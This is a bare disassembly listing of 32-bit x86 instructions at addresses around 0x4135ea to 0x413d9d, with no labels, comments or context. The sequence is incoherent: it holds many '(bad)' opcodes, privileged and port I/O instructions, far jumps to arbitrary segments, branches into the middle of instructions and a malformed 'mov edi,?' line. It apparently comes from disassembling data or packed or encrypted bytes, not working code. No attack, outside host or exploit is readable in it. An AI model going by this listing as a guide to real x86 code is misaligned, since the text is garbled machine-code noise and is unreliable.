  4135ea:	push   ebx
  4135eb:	das    
  4135ec:	pop    esi
  4135ed:	inc    ebx
  4135ee:	fs xor eax,0x6067d0c8
  4135f4:	mov    ecx,gs
  4135f6:	fbld   TBYTE PTR [ecx]
  4135f8:	imul   edx,ebp,0x6553d106
  4135fe:	xor    BYTE PTR [eax+0x3e615a21],al
  413604:	dec    edi
  413605:	enter  0xc554,0xc7
  413609:	push   esi
  41360a:	mov    dh,0x36
  41360c:	jecxz  0x4135fc
  41360e:	sti    
  41360f:	fimul  DWORD PTR [edi+eax*4-0x4d]
  413613:	pop    es
  413614:	loope  0x4135aa
  413616:	adc    bl,BYTE PTR [ecx+0x2d]
  413619:	cli    
  41361a:	jmp    0x4135b8
  41361c:	or     DWORD PTR [eax+0x3f5ad61d],edi
  413622:	add    DWORD PTR [ebp+0x1c],edi
  413625:	fcomip st,st(2)
  413627:	cdq    
  413628:	xor    BYTE PTR [edi-0x15594b5f],dh
  41362e:	daa    
  41362f:	pop    es
  413630:	shl    DWORD PTR [ecx-0x4e],1
  413633:	fwait
  413634:	mov    ebx,0x73254778
  413639:	clc    
  41363a:	gs pop esp
  41363c:	inc    esi
  41363d:	sahf   
  41363e:	sub    DWORD PTR [edi],esi
  413640:	mov    al,0xab
  413642:	aas    
  413643:	cdq    
  413644:	stos   DWORD PTR es:[edi],eax
  413645:	cdq    
  413646:	scas   al,BYTE PTR es:[edi]
  413647:	lock cmp DWORD PTR [edi-0x67f8d7bc],esp
  41364e:	xchg   DWORD PTR [ebx-0xb],esi
  413651:	je     0x4135dd
  413653:	and    DWORD PTR [edx+0x3d],edi
  413656:	sbb    ecx,ebp
  413658:	cld    
  413659:	push   esi
  41365a:	sti    
  41365b:	jge    0x413621
  41365d:	pop    ebp
  41365e:	inc    edx
  41365f:	cld    
  413660:	cli    
  413661:	enter  0xf030,0x65
  413665:	xor    al,0xc3
  413667:	jo     0x413657
  413669:	xor    BYTE PTR [ebx],al
  41366b:	sub    dl,BYTE PTR [edi]
  41366d:	mov    ah,0x78
  41366f:	in     eax,0x38
  413671:	lds    eax,FWORD PTR [eax]
  413673:	cdq    
  413674:	lea    ebp,[ecx]
  413676:	sub    DWORD PTR [ecx],ecx
  413678:	sti    
  413679:	jle    0x413663
  41367b:	mov    bh,BYTE PTR [ebx]
  41367d:	aas    
  41367e:	daa    
  41367f:	iret   
  413680:	or     eax,0xb6df960b
  413685:	mov    ebx,0xe4c60913
  41368a:	ret    0x4d61
  41368d:	in     al,dx
  41368e:	fisubr WORD PTR [eax+0xe]
  413691:	scas   al,BYTE PTR es:[edi]
  413692:	(bad)  
  413693:	rol    BYTE PTR [edx+0x61],cl
  413696:	cs data16 std 
  413699:	sar    BYTE PTR [ebp+0x40a453b9],1
  41369f:	adc    DWORD PTR [edx],ebx
  4136a1:	sahf   
  4136a2:	ror    DWORD PTR [ecx+ebx*8-0x6ce8c527],cl
  4136a9:	xlat   BYTE PTR ds:[ebx]
  4136aa:	repnz mov ah,BYTE PTR [ecx-0x44]
  4136ae:	leave  
  4136af:	pop    ebx
  4136b0:	in     eax,0x8
  4136b2:	xor    dl,al
  4136b4:	cmp    al,0x81
  4136b6:	jecxz  0x413715
  4136b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b9:	enter  0xa1b9,0x6a
  4136bd:	cmp    DWORD PTR [ebx+0x5c],ebp
  4136c0:	aam    0xe3
  4136c2:	bound  ebp,QWORD PTR [esi]
  4136c4:	sbb    al,0x12
  4136c6:	inc    esp
  4136c7:	cmp    al,0x86
  4136c9:	sahf   
  4136ca:	adc    al,0xb
  4136cc:	adc    bh,BYTE PTR [ebx-0x28]
  4136cf:	ror    BYTE PTR [eax-0x1a],cl
  4136d2:	adc    DWORD PTR [eax],ebx
  4136d4:	and    BYTE PTR [edi+eax*4-0x7f57473e],bh
  4136db:	push   ds
  4136dc:	cmc    
  4136dd:	xor    cl,BYTE PTR [ebp-0x10]
  4136e0:	call   0xcf52caa7
  4136e5:	sub    al,0x37
  4136e7:	shl    DWORD PTR [ebp+0x2628654f],cl
  4136ed:	cli    
  4136ee:	mov    DWORD PTR cs:[ebp+0xd012bdc],ebx
  4136f5:	ror    DWORD PTR [edx+0x55f02c3c],cl
  4136fb:	jl     0x41376d
  4136fd:	xchg   DWORD PTR [esi+0x36],ebp
  413700:	popf   
  413701:	test   al,0xa5
  413703:	mov    al,ds:0x78efa17f
  413708:	cmp    al,0x1e
  41370a:	pop    esi
  41370b:	or     ecx,edi
  41370d:	mov    ds:0x8596e87b,al
  413712:	dec    esi
  413713:	adc    DWORD PTR ds:0x2b436c2c,edx
  413719:	pusha  
  41371a:	xor    DWORD PTR [ecx-0x26fae41a],edi
  413720:	inc    eax
  413721:	hlt    
  413722:	inc    ebx
  413723:	mov    ah,0xfd
  413725:	push   edi
  413726:	inc    eax
  413727:	stos   DWORD PTR es:[edi],eax
  413728:	xchg   DWORD PTR [edx+0x2c02bcd0],esp
  41372e:	sub    DWORD PTR [esi],edi
  413730:	in     al,dx
  413731:	pop    esp
  413732:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  413734:	mov    bl,0xc0
  413736:	test   eax,0xb19d31ec
  41373b:	pop    esp
  41373c:	jmp    0x4136e5
  41373e:	out    dx,eax
  41373f:	push   esp
  413740:	js     0x413744
  413742:	hlt    
  413743:	out    0xcb,eax
  413745:	mov    ds:0xa946380d,eax
  41374a:	xchg   esi,eax
  41374b:	gs int3 
  41374d:	xor    BYTE PTR [esi-0x224bf8eb],bh
  413753:	dec    ebp
  413754:	cmp    esi,DWORD PTR ds:0xb5e25680
  41375a:	inc    esi
  41375b:	dec    ebp
  41375c:	out    dx,eax
  41375d:	dec    edx
  41375e:	lods   al,BYTE PTR ds:[esi]
  41375f:	mov    ah,0x68
  413761:	xchg   esi,eax
  413762:	mov    edx,0xd34bacc5
  413767:	sbb    esp,DWORD PTR [ebp-0x1b]
  41376a:	retf   0x64ea
  41376d:	sti    
  41376e:	fwait
  41376f:	push   DWORD PTR [ecx+0xb]
  413772:	fdiv   DWORD PTR [ebx+ebx*4-0x3b1403bc]
  413779:	jb     0x4137d1
  41377b:	or     bl,BYTE PTR [edx+0x23]
  41377e:	stc    
  41377f:	mov    edi,?
  413781:	int    0x14
  413783:	cmp    al,0x5d
  413785:	dec    edx
  413786:	in     al,dx
  413787:	mov    ch,0x6e
  413789:	mov    al,0x36
  41378b:	(bad)  
  41378c:	in     eax,dx
  41378d:	jmp    0xa3db30b5
  413792:	jmp    0x7b3:0x8444f036
  413799:	jg     0x413766
  41379b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41379c:	mov    esi,0xb7127cd6
  4137a1:	(bad)  
  4137a2:	out    0x39,eax
  4137a4:	(bad)
  4137a9:	rcr    DWORD PTR [esi],cl
  4137ab:	loopne 0x4137d5
  4137ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137ae:	xchg   ecx,eax
  4137af:	push   0xc417cde9
  4137b4:	dec    BYTE PTR [edi+0x28]
  4137b7:	js     0x413804
  4137b9:	adc    esp,esi
  4137bb:	pop    ecx
  4137bc:	pop    ecx
  4137bd:	mov    edi,DWORD PTR [ebx]
  4137bf:	push   ds
  4137c0:	rcr    BYTE PTR [ebx+0x3c845c8a],cl
  4137c6:	cld    
  4137c7:	jge    0x41382e
  4137c9:	stc    
  4137ca:	jl     0x41380b
  4137cc:	popf   
  4137cd:	or     edi,DWORD PTR [ebx+0x27]
  4137d0:	jne    0x41381e
  4137d2:	(bad)  
  4137d3:	push   ss
  4137d4:	cwde   
  4137d5:	in     al,dx
  4137d6:	push   eax
  4137d7:	cmp    al,0xc1
  4137d9:	call   0xb2a2:0x20f31cbb
  4137e0:	jge    0x4137c7
  4137e2:	xor    cl,al
  4137e4:	lods   eax,DWORD PTR ds:[esi]
  4137e5:	dec    esp
  4137e6:	sbb    ah,BYTE PTR [eax-0x6a]
  4137e9:	std    
  4137ea:	dec    ebp
  4137eb:	xchg   ebx,eax
  4137ec:	les    edi,FWORD PTR [ebx+esi*2-0xe3b41f]
  4137f3:	fwait
  4137f4:	inc    ecx
  4137f5:	jge    0x41381a
  4137f7:	dec    ebx
  4137f8:	jnp    0x4137ce
  4137fa:	imul   ebx,DWORD PTR [ecx+0x751a673c],0xffffffb7
  413801:	push   ecx
  413802:	sbb    BYTE PTR [ebx],ch
  413804:	pop    ss
  413805:	nop
  413806:	mov    WORD PTR [esi],fs
  413808:	icebp  
  413809:	push   ss
  41380a:	scas   al,BYTE PTR es:[edi]
  41380b:	push   0xdf0b64b3
  413810:	pop    eax
  413811:	push   0xffffffb9
  413813:	repz jp 0x4137c0
  413816:	fistp  DWORD PTR [ebp+0x21ee2d2b]
  41381c:	jns    0x4137c6
  41381e:	out    dx,eax
  41381f:	ret    
  413820:	mov    ah,BYTE PTR [ebp-0x59]
  413823:	sbb    al,0xf7
  413825:	outs   dx,BYTE PTR ds:[esi]
  413826:	cmc    
  413827:	fwait
  413828:	xchg   DWORD PTR [eax+0x8dd7c8a],ebp
  41382e:	cld    
  41382f:	mov    ebp,0x96c7b5a9
  413834:	mov    edi,gs
  413836:	cdq    
  413837:	out    0xe9,eax
  413839:	jo     0x4137bf
  41383b:	leave  
  41383c:	jmp    0x2abd:0xe3f45d61
  413843:	push   0xf8ca8667
  413848:	add    ah,BYTE PTR [ebx-0x64]
  41384b:	jns    0x413885
  41384d:	cli    
  41384e:	(bad)  
  41384f:	push   edx
  413850:	push   esi
  413851:	xchg   esp,eax
  413852:	rcl    BYTE PTR [eax],0x60
  413855:	pop    eax
  413856:	stos   DWORD PTR es:[edi],eax
  413857:	stos   DWORD PTR es:[edi],eax
  413858:	fcom   DWORD PTR [ecx+0x3ffbbf17]
  41385e:	cmp    ebp,DWORD PTR [ecx-0x54ae272e]
  413864:	in     eax,0xd0
  413866:	fstp   DWORD PTR [ecx-0x1f]
  413869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41386a:	mov    dh,0x44
  41386c:	pop    edx
  41386d:	mov    edi,DWORD PTR [ebx+edi*8-0x26418ef4]
  413874:	mov    WORD PTR [ecx-0x71],ds
  413877:	fsubr  st(4),st
  413879:	hlt    
  41387a:	sar    BYTE PTR ds:0x891ed1b5,cl
  413880:	xadd   DWORD PTR [eax+0x6e],eax
  413884:	ins    BYTE PTR es:[edi],dx
  413885:	iret   
  413886:	add    edi,DWORD PTR [edx-0x22a70854]
  41388c:	jae    0x4138a1
  41388e:	add    DWORD PTR [ebp+0x9],ebp
  413891:	add    ebp,ebp
  413893:	in     eax,dx
  413894:	mov    BYTE PTR [ecx-0x5b],ch
  413897:	mov    ds:0xbf46f31f,eax
  41389c:	and    edi,DWORD PTR [ebp+ebx*8-0x5f2a2eb8]
  4138a3:	pop    ebp
  4138a4:	sar    BYTE PTR [edx+0x2a],cl
  4138a7:	xor    ebx,DWORD PTR [edx]
  4138a9:	jnp    0x41386a
  4138ab:	int3   
  4138ac:	dec    edx
  4138ad:	dec    esp
  4138ae:	sub    BYTE PTR [eax],0xe2
  4138b1:	mov    BYTE PTR [edi-0x79],ah
  4138b4:	mov    eax,ds:0xb34b5956
  4138b9:	sub    BYTE PTR [edi+0x24],bl
  4138bc:	mov    dl,0x97
  4138be:	cmp    dh,BYTE PTR [esi+0x71]
  4138c1:	std    
  4138c2:	push   DWORD PTR [ebx+0xf]
  4138c5:	sbb    eax,0x5cc90b43
  4138ca:	std    
  4138cb:	jp     0x41387d
  4138cd:	sti    
  4138ce:	mov    cl,BYTE PTR [edi+edi*4+0x18]
  4138d2:	imul   esp,edi,0x3678401b
  4138d8:	jne    0x41394d
  4138da:	stos   BYTE PTR es:[edi],al
  4138db:	dec    eax
  4138dc:	add    eax,0x9e771035
  4138e1:	stos   DWORD PTR es:[edi],eax
  4138e2:	cmp    BYTE PTR [edx-0x2bb0b43f],0x3d
  4138e9:	sub    DWORD PTR [ebp+0x8],ebp
  4138ec:	or     bl,BYTE PTR [ecx-0x6]
  4138ef:	inc    ebx
  4138f0:	jb     0x41392c
  4138f2:	es xchg edx,eax
  4138f4:	in     al,0xc8
  4138f6:	sbb    ah,BYTE PTR [ebx-0x3c766297]
  4138fc:	sub    DWORD PTR [edi],0x23
  4138ff:	or     BYTE PTR [esi+0xa],ah
  413902:	dec    eax
  413903:	jecxz  0x4138ff
  413905:	mov    ah,0xf0
  413907:	and    ah,dh
  413909:	jg     0x4138bd
  41390b:	neg    DWORD PTR [edx]
  41390d:	retf   0x1922
  413910:	cli    
  413911:	das    
  413912:	sti    
  413913:	in     al,dx
  413914:	aaa    
  413915:	pop    ebx
  413916:	nop
  413917:	mov    edx,0xfc41ab8e
  41391c:	adc    eax,0x9bc841a6
  413921:	ja     0x413927
  413923:	adc    al,0x15
  413925:	pop    edx
  413926:	icebp  
  413927:	(bad)
  41392b:	mov    al,ds:0xc9297ec4
  413930:	xchg   ecx,eax
  413931:	mov    bl,0x5b
  413933:	or     dh,dl
  413935:	xor    cl,al
  413937:	jmp    0xc29f3f79
  41393c:	loope  0x41398e
  41393e:	fistp  DWORD PTR [eax+edx*2]
  413941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413942:	pop    ebp
  413943:	into   
  413944:	pusha  
  413945:	mov    esp,0x56b07575
  41394a:	stos   DWORD PTR es:[edi],eax
  41394b:	fidivr DWORD PTR [eax]
  41394d:	mov    dx,0x5a8b
  413951:	shl    DWORD PTR [ecx+eiz*1-0x60],0x9
  413956:	rcl    DWORD PTR [edi],0x81
  413959:	pop    edi
  41395a:	scas   eax,DWORD PTR es:[edi]
  41395b:	dec    edx
  41395c:	add    al,0xec
  41395e:	aam    0x7
  413960:	sbb    DWORD PTR [edi-0x6239c45e],eax
  413966:	xchg   BYTE PTR [edx+eiz*8-0x4181fbad],al
  41396d:	adc    BYTE PTR [esi+0x45],dl
  413970:	jl     0x413984
  413972:	hlt    
  413973:	or     al,0x20
  413975:	cwde   
  413976:	shl    DWORD PTR [ecx+0x14],cl
  413979:	xor    DWORD PTR [eax-0x74],ebx
  41397c:	outs   dx,BYTE PTR ds:[esi]
  41397d:	popa   
  41397e:	mov    ah,0x58
  413980:	xor    al,0xc7
  413982:	sti    
  413983:	jecxz  0x413969
  413985:	add    BYTE PTR [eax],0x9
  413988:	fisubr WORD PTR [eax-0x4d067671]
  41398e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41398f:	in     al,dx
  413990:	and    eax,0xd2f8ed32
  413995:	ins    BYTE PTR es:[edi],dx
  413996:	sub    bl,bh
  413998:	pushf  
  413999:	pushf  
  41399a:	shr    BYTE PTR [esi-0x67],cl
  41399d:	dec    esp
  41399e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41399f:	icebp  
  4139a0:	hlt    
  4139a1:	push   ebp
  4139a2:	jg     0x41396f
  4139a4:	loop   0x41397b
  4139a6:	xchg   ebx,eax
  4139a7:	pop    eax
  4139a8:	xor    cl,bh
  4139aa:	sti    
  4139ab:	clc    
  4139ac:	xor    DWORD PTR [edx-0x48ff6592],eax
  4139b2:	fbld   TBYTE PTR [eax]
  4139b4:	dec    ebx
  4139b5:	mov    ah,bl
  4139b7:	mov    dl,0xff
  4139b9:	and    al,BYTE PTR [eax]
  4139bb:	cvtpi2ps xmm6,QWORD PTR [ecx-0x51]
  4139bf:	add    BYTE PTR [ebx-0x7f1269b],cl
  4139c5:	jmp    0xc64c:0xba688650
  4139cc:	pusha  
  4139cd:	mov    WORD PTR [ebx],cs
  4139cf:	and    ch,ah
  4139d1:	jno    0x41396c
  4139d3:	jecxz  0x413a2a
  4139d5:	shr    BYTE PTR [ebx+0x65],cl
  4139d8:	mov    eax,0x26947f26
  4139dd:	test   DWORD PTR [ebx+0x34],eax
  4139e0:	aad    0xa1
  4139e2:	cld    
  4139e3:	dec    esi
  4139e4:	(bad)  
  4139e5:	stos   DWORD PTR es:[edi],eax
  4139e6:	dec    edi
  4139e7:	jb     0x413a4b
  4139e9:	sbb    eax,0xf90d309c
  4139ee:	sti    
  4139ef:	or     ah,BYTE PTR [ebx-0x39]
  4139f2:	into   
  4139f3:	aam    0x52
  4139f5:	in     eax,0xe4
  4139f7:	jp     0x4139ff
  4139f9:	fst    st(4)
  4139fb:	test   eax,0x45deb8d5
  413a00:	xchg   esi,eax
  413a01:	sbb    eax,0x1cf008b4
  413a06:	adc    dh,al
  413a08:	add    ch,BYTE PTR [esi+0x3e]
  413a0b:	adc    BYTE PTR [edx-0x66aa98a],ch
  413a11:	fild   DWORD PTR [eax]
  413a13:	neg    BYTE PTR [eax+0x28dae134]
  413a19:	fst    QWORD PTR [ecx]
  413a1b:	add    ecx,DWORD PTR [ebx]
  413a1d:	and    al,0xad
  413a1f:	ret    
  413a20:	gs dec edx
  413a22:	int    0x30
  413a24:	popa   
  413a25:	sbb    eax,0xee13d864
  413a2a:	fs cmp eax,0x8035f958
  413a30:	jg     0x413a34
  413a32:	dec    esi
  413a33:	loopne 0x413a65
  413a35:	and    BYTE PTR [esi+0x70e53d5c],ah
  413a3b:	mov    es,WORD PTR [ebp+0x256d70b1]
  413a41:	mov    al,0x2b
  413a43:	aaa    
  413a44:	out    dx,eax
  413a45:	push   0xa67dc113
  413a4a:	xor    ch,BYTE PTR [ebx+0x2f]
  413a4d:	jb     0x413a56
  413a4f:	scas   al,BYTE PTR es:[edi]
  413a50:	aas    
  413a51:	icebp  
  413a52:	lds    ebp,FWORD PTR ds:0xbefccf8f
  413a58:	adc    al,BYTE PTR [edx]
  413a5a:	aam    0x8
  413a5c:	mov    esi,0xffdf3711
  413a61:	push   ebx
  413a62:	jge    0x413a9c
  413a64:	cmp    al,0xad
  413a66:	add    DWORD PTR [esi+0x12345b1b],esp
  413a6c:	jae    0x413a1d
  413a6e:	cmp    BYTE PTR [ecx+0x2d52e746],dl
  413a74:	xchg   ebx,eax
  413a75:	lea    edx,[ecx+0x42]
  413a78:	ins    DWORD PTR es:[edi],dx
  413a79:	dec    edi
  413a7a:	adc    DWORD PTR [ebx+ecx*4],esi
  413a7d:	xchg   esi,eax
  413a7e:	pop    ebx
  413a7f:	mov    bl,0xd4
  413a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a82:	hlt    
  413a83:	add    edi,DWORD PTR [eax+ebp*2-0x55595fec]
  413a8a:	jmp    0x413a17
  413a8c:	cwde   
  413a8d:	cmp    edi,DWORD PTR [edx-0x10966866]
  413a93:	or     dh,cl
  413a95:	or     eax,0x9c179e23
  413a9a:	call   0x1e58:0x6d686fa
  413aa1:	mov    dh,0x4f
  413aa3:	jmp    0x1162:0x5b95df45
  413aaa:	aas    
  413aab:	sub    eax,edx
  413aad:	pop    ebp
  413aae:	stos   BYTE PTR es:[edi],al
  413aaf:	jp     0x413ae4
  413ab1:	test   DWORD PTR [esi+0x494c7c43],eax
  413ab7:	inc    edi
  413ab8:	repnz inc ebp
  413aba:	ja     0x413ab8
  413abc:	mov    ebp,DWORD PTR [edi]
  413abe:	jmp    0x9dca8941
  413ac3:	mov    esi,0xa622a37
  413ac8:	cmp    al,0x4e
  413aca:	xor    eax,0x34c91650
  413acf:	popf   
  413ad0:	pop    ebx
  413ad1:	jge    0x413a55
  413ad3:	leave  
  413ad4:	xchg   ebx,eax
  413ad5:	inc    edi
  413ad6:	jp     0x413b07
  413ad8:	mov    ds:0x8255f456,al
  413add:	push   esp
  413ade:	push   ss
  413adf:	stc    
  413ae0:	or     al,0x1e
  413ae2:	ds es call 0xa6b79e9a
  413ae9:	dec    ebx
  413aea:	inc    esp
  413aeb:	je     0x413b40
  413aed:	imul   ebp,eax,0x134bb8e9
  413af3:	inc    ebp
  413af4:	and    al,0x8a
  413af6:	or     bh,BYTE PTR [edx+edx*1+0x52]
  413afa:	pop    ss
  413afb:	js     0x413b51
  413afd:	clc    
  413afe:	shl    BYTE PTR [edi-0x60],1
  413b01:	cmp    BYTE PTR [edi+0x24a2e29d],0xaa
  413b08:	lods   eax,DWORD PTR ds:[esi]
  413b09:	mov    dl,BYTE PTR [edx+esi*8+0x60cf5a4a]
  413b10:	mov    ebp,0x23dcde5e
  413b15:	or     dh,BYTE PTR [eax]
  413b17:	and    BYTE PTR [edi-0x73],al
  413b1a:	pop    esi
  413b1b:	xchg   edx,eax
  413b1c:	pop    ecx
  413b1d:	cmp    ch,ah
  413b1f:	xor    BYTE PTR [ebx-0x7bfed386],bl
  413b25:	inc    ebx
  413b26:	pop    eax
  413b27:	push   edx
  413b28:	push   ss
  413b29:	icebp  
  413b2a:	push   es
  413b2b:	xchg   edi,eax
  413b2c:	xor    DWORD PTR [eax-0xf8fa255],eax
  413b32:	jb     0x413b77
  413b34:	xchg   edi,eax
  413b35:	rol    dh,cl
  413b37:	cmp    al,0xfd
  413b39:	rcl    ebx,0xc2
  413b3c:	ds xchg ebp,eax
  413b3e:	sub    eax,0x5ebd8623
  413b43:	fistp  DWORD PTR [ebp-0x7a]
  413b46:	jbe    0x726bcb35
  413b4c:	inc    esi
  413b4d:	stc    
  413b4e:	(bad)  
  413b4f:	cmp    DWORD PTR [edi+0xfa7ca7c],edx
  413b55:	sbb    edx,DWORD PTR [ebx-0x429a94f1]
  413b5b:	mov    DWORD PTR [ebx+edx*1],edx
  413b5e:	lea    ebx,[edi+0x2a]
  413b61:	dec    esp
  413b62:	mov    ebx,0x350d1ad6
  413b67:	push   eax
  413b68:	pop    edi
  413b69:	inc    ebp
  413b6a:	enter  0x6717,0x89
  413b6e:	in     eax,dx
  413b6f:	cmp    bh,BYTE PTR [edx]
  413b71:	stc    
  413b72:	ins    DWORD PTR es:[edi],dx
  413b73:	into   
  413b74:	sbb    ebp,DWORD PTR [ebp-0xdeda2b5]
  413b7a:	(bad)  
  413b7b:	jge    0x413b8a
  413b7d:	cli    
  413b7e:	enter  0x156a,0xad
  413b82:	lahf   
  413b83:	add    DWORD PTR [esi],esi
  413b85:	inc    esp
  413b86:	mov    edx,0xcba805f0
  413b8b:	ror    BYTE PTR [ebx+0xd36f79b],1
  413b91:	shl    BYTE PTR [eax+0xa37dedc],cl
  413b97:	leave  
  413b98:	inc    edx
  413b99:	xor    BYTE PTR [esi-0x31f552dc],al
  413b9f:	scas   al,BYTE PTR es:[edi]
  413ba0:	arpl   WORD PTR [ebx-0x29b27246],si
  413ba6:	call   FWORD PTR [eax-0x784a90c]
  413bac:	jg     0x413bf7
  413bae:	mov    ecx,0xd03a0bee
  413bb3:	lea    esi,[esp+edi*8-0x80]
  413bb7:	push   esp
  413bb8:	loopne 0x413b79
  413bba:	adc    ebx,DWORD PTR [ebx-0x2a637b6f]
  413bc0:	jae    0x413ba3
  413bc2:	fild   WORD PTR [eax]
  413bc4:	imul   ebx,DWORD PTR [ebp-0x7f3e017e],0x30
  413bcb:	pushf  
  413bcc:	mov    ds:0xeaa37674,al
  413bd1:	mov    bh,BYTE PTR [esi+0x2386f6d]
  413bd7:	pop    edx
  413bd8:	push   0x1d
  413bda:	test   bl,bh
  413bdc:	jmp    0xf83b76dc
  413be1:	cmp    DWORD PTR [ebx+0x31],0xed79d873
  413be8:	mov    eax,0x594350fe
  413bed:	push   es
  413bee:	push   esp
  413bef:	pop    eax
  413bf0:	loopne 0x413be3
  413bf2:	test   edx,eax
  413bf4:	inc    edx
  413bf5:	addr16 aaa 
  413bf7:	cdq    
  413bf8:	and    edx,DWORD PTR [ebx+0x32272405]
  413bfe:	dec    edx
  413bff:	call   0x62ef:0x3601db54
  413c06:	out    dx,al
  413c07:	repnz mov edi,0x92a4f60f
  413c0d:	sbb    BYTE PTR [edi+0x525427e3],0x57
  413c14:	jl     0x413c93
  413c16:	fdiv   DWORD PTR [edx-0x36]
  413c19:	sbb    ah,dl
  413c1b:	push   ebp
  413c1c:	and    ah,cl
  413c1e:	ds js  0x413ba3
  413c21:	xchg   DWORD PTR [eax-0xb],ebx
  413c24:	sub    al,0xc1
  413c26:	inc    ebx
  413c27:	and    BYTE PTR [edi+ebp*2-0x5c833bf1],bh
  413c2e:	ins    DWORD PTR es:[edi],dx
  413c2f:	mov    bh,BYTE PTR [ebx]
  413c31:	ss test eax,0xcaad1ffe
  413c37:	lds    eax,FWORD PTR [esp+edi*4-0x35]
  413c3b:	jmp    0x29a8def9
  413c40:	push   edi
  413c41:	and    al,0xd5
  413c43:	jno    0x413bcd
  413c45:	mov    dh,0x7d
  413c47:	(bad)  
  413c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c49:	idiv   bl
  413c4b:	sub    DWORD PTR [edx],esi
  413c4d:	xor    BYTE PTR [ecx],ch
  413c4f:	sbb    ch,BYTE PTR [eax+ecx*8-0x75ee4785]
  413c56:	rcl    bl,1
  413c58:	arpl   bp,bx
  413c5a:	push   es
  413c5b:	shl    bh,0x9d
  413c5e:	inc    esi
  413c5f:	stc    
  413c60:	mov    edi,0xc4c42983
  413c65:	pop    ss
  413c66:	pop    edi
  413c67:	dec    eax
  413c68:	jg     0x413c1b
  413c6a:	lea    edi,[ebx]
  413c6c:	push   es
  413c6d:	and    al,0xfc
  413c6f:	fwait
  413c70:	shl    BYTE PTR [edx],0xec
  413c73:	retf   0x2383
  413c76:	jecxz  0x413c3f
  413c78:	sahf   
  413c79:	jno    0x413c04
  413c7b:	push   esp
  413c7c:	int    0xad
  413c7e:	loop   0x413c26
  413c80:	rcr    BYTE PTR es:[edi+0x61],1
  413c84:	dec    ebx
  413c85:	sub    BYTE PTR [edi+0x75],ah
  413c88:	rcr    DWORD PTR [edi+eiz*2],0x8
  413c8c:	sub    BYTE PTR [eax-0x3d],al
  413c8f:	(bad)  
  413c90:	mov    ebp,eax
  413c92:	mov    esi,0x62832957
  413c97:	sbb    BYTE PTR [ecx-0x7de749d2],cl
  413c9d:	mov    ebx,0x75078c6
  413ca2:	xor    dl,BYTE PTR [edi]
  413ca4:	fsubr  st,st(4)
  413ca6:	lods   al,BYTE PTR ds:[esi]
  413ca7:	neg    DWORD PTR [esi-0x5c5a5c07]
  413cad:	sub    BYTE PTR [ebx],0x90
  413cb0:	out    dx,eax
  413cb1:	repz popf 
  413cb3:	es push 0x804566f8
  413cb9:	or     DWORD PTR [edx-0x3f],ebx
  413cbc:	retf   
  413cbd:	pop    ebx
  413cbe:	test   al,0x88
  413cc0:	add    BYTE PTR [edx-0x2e],dl
  413cc3:	mov    eax,0x1b742e42
  413cc8:	in     al,0x14
  413cca:	push   edx
  413ccb:	push   ebp
  413ccc:	sbb    DWORD PTR [edx+0x2d],0xd12e8360
  413cd3:	xor    ebp,DWORD PTR [eax-0x62]
  413cd6:	dec    ebp
  413cd7:	jae    0x413cc4
  413cd9:	jg     0x413d13
  413cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cdc:	jo     0x413d5a
  413cde:	xor    al,0xe5
  413ce0:	into   
  413ce1:	ds xchg ebx,eax
  413ce3:	stc    
  413ce4:	cmp    al,0x6b
  413ce6:	pusha  
  413ce7:	outs   dx,DWORD PTR ds:[esi]
  413ce8:	mov    ebp,0xa2c69966
  413ced:	xchg   esp,eax
  413cee:	es hlt 
  413cf0:	add    al,BYTE PTR [ebx+0x59]
  413cf3:	mov    edi,0xde7d37c5
  413cf8:	dec    esp
  413cf9:	inc    edx
  413cfa:	into   
  413cfb:	and    BYTE PTR [ebx+eax*8+0x18],dh
  413cff:	jns    0x413ced
  413d01:	sar    BYTE PTR [edx-0x5f],1
  413d04:	(bad)  
  413d05:	adc    ebp,ebp
  413d07:	sahf   
  413d08:	jne    0x413cc6
  413d0a:	mov    DWORD PTR [ecx+0xbd7b32],eax
  413d10:	idiv   BYTE PTR [ebx-0x53c14b6c]
  413d16:	cmp    ah,BYTE PTR [edi]
  413d18:	(bad)  
  413d19:	pop    ds
  413d1a:	stc    
  413d1b:	ret    0x67df
  413d1e:	cmpxchg BYTE PTR [edx+ebp*4-0x2],al
  413d23:	(bad)  [ebp+0x35f60bea]
  413d29:	or     al,0x1b
  413d2b:	enter  0xca2e,0xfb
  413d2f:	cmp    DWORD PTR [eax],0x814ef5d6
  413d35:	popf   
  413d36:	out    0x1e,al
  413d38:	out    0xed,eax
  413d3a:	jno    0x413d88
  413d3c:	push   0xffffffe5
  413d3e:	(bad)  
  413d40:	cmp    edx,edx
  413d42:	loope  0x413d5c
  413d44:	push   eax
  413d45:	dec    edi
  413d46:	clc    
  413d47:	ins    DWORD PTR es:[edi],dx
  413d48:	sbb    eax,DWORD PTR [edi+0x70]
  413d4b:	sub    edi,ebx
  413d4d:	inc    eax
  413d4e:	xchg   edi,eax
  413d4f:	bound  eax,QWORD PTR [esi+0x27]
  413d52:	daa    
  413d53:	mov    dh,0xa
  413d55:	jo     0x413d93
  413d57:	arpl   WORD PTR [edx],bp
  413d59:	rcr    BYTE PTR [ebp+esi*8+0x6918114a],cl
  413d60:	dec    ebp
  413d61:	fsubp  st(6),st
  413d63:	shr    eax,1
  413d65:	aam    0x8e
  413d67:	push   0xffffff88
  413d69:	addr16 push ebp
  413d6b:	fiadd  DWORD PTR [edi+0x5d3ec162]
  413d71:	fld    DWORD PTR [ebx+0x10c034a1]
  413d77:	cmp    bl,BYTE PTR [eax+0x640679b5]
  413d7d:	repz fwait
  413d7f:	pop    ss
  413d80:	leave  
  413d81:	mov    esi,0x636429a0
  413d86:	xor    cl,cl
  413d88:	inc    ecx
  413d89:	add    eax,DWORD PTR [ebp+0x47df81f0]
  413d8f:	pusha  
  413d90:	mov    bl,0xbb
  413d92:	aam    0xcf
  413d94:	and    DWORD PTR [esi+0x17cc4266],edi
  413d9a:	push   ss
  413d9b:	push   0x61
  413d9d:	or     edi,ecx
